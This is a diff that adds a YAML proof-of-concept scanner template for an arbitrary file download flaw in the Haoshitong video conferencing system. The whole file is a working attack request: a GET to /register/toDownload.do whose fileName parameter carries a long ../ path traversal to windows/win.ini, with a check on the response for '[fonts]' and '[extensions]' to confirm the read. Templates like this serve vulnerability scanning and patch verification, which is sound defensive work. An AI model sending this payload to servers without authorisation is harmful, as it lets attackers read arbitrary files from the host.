@@ -1,0 +1,13 @@
+id: poc-yaml-haoshitong-video-conferencing-arbitrary-download
+info:
+  name: 好视通视频会议系统-任意文件下载
+  severity: high
+  tags:
+  - 文件读取
+  finger: 好视通视频会议系统
+requests:
+- method: GET
+  path: /register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini
+  expression: status_code == 200 && contains(body, "[fonts]") && contains(body, "[extensions]")
+variables: {}
+transport: http
